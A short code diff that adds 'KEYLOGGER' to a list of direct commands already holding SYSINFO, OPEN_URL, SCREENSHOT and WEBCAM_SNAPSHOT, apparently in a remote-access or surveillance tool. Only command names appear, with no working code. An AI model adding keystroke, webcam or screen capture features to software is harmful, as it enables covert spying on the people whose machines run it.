@@ -25,6 +25,7 @@ direct = ["SYSINFO",
           "OPEN_URL",
           "SCREENSHOT",
           "WEBCAM_SNAPSHOT",
+          "KEYLOGGER",
           "EXIT"
           ]
 
